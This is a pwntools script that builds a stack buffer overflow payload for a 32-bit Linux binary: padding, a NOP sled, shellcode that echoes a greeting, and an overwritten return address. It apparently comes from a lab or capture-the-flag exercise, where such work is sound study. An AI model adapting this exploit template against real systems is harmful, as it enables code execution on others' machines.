from pwn import *
context.arch='i386'
context.os='linux'

#ret_addr = 0x565562ad #secret_key
#ret_addr = 0x565562e5 #pat_on_back
ret_addr = 0xffffd1fc - 151 #shellcode
addr = p32(ret_addr, endian='little')
nop = asm('nop', arch='i386')
#s_code_asm = asm(s_code)
payload = b"2\n" + b"A"*1022
# payload += nop*(151 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr
s_code = shellcraft.i386.linux.echo('Hello world!!') + shellcraft.i386.linux.exit()
s_code_asm = asm(s_code)
#payload += nop*151 + addr
payload += nop*(151 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr

with open("./shellcode_payload", "wb") as f:
	f.write(payload)